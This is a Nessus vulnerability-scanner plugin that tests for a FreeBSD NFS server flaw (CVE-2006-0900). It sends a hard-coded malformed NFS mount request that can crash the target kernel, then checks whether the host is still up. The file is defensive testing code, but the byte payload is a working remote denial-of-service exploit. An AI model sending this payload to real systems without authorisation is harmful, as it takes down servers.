#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20989);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2015/01/14 15:43:28 $");

  script_cve_id("CVE-2006-0900");
  script_bugtraq_id(16838);
  script_osvdb_id(23511);

  script_name(english:"FreeBSD nfsd Malformed NFS Mount Request Remote DoS");
  script_summary(english:"Tries to crash remote FreeBSD host");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The NFS server on the remote host appears to be one from FreeBSD that
causes a kernel panic when it receives a malformed NFS mount request
via TCP. An unauthenticated remote attacker can leverage this flaw to
crash the remote host.");
  # http://web.archive.org/web/20100228073003/http://lists.immunitysec.com/pipermail/dailydave/2006-February/002982.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?31514c89");
  # ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-06:10.nfs.asc
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2335c1e7");
  script_set_attribute(attribute:"solution", value:
"Use a firewall to restrict access to the NFS server or upgrade / patch
the affected system as described in the vendor advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/03/01");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:freebsd:freebsd");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");
  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "rpcinfo.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/rpc-nfs", 2049);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

os = get_kb_item("Host/OS");
if (!os) exit(0);

if (!egrep(pattern:"freebsd", string:os, icase:TRUE)) exit(0);

if (islocalhost()) exit(0);
port = get_kb_item("Services/rpc-nfs");
if (!port) port = 2049;
if (!get_port_state(port)) exit(0);


# A bad NFS mount request.
req = raw_string(
  0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
  0x00, 0x01, 0x86, 0xa5, 0x00, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04,
  0x2f, 0x74, 0x6d, 0x70
);


# Open a socket and try to crash the remote host.
soc = open_sock_tcp(port);
if (soc) {
  start_denial();


  send(socket:soc, data:req);
  close(soc);

  # Check whether it's now down.
  alive = end_denial();
  if (!alive) {
    security_hole(port);
    set_kb_item(name:"Host/dead", value:TRUE);
  }
}
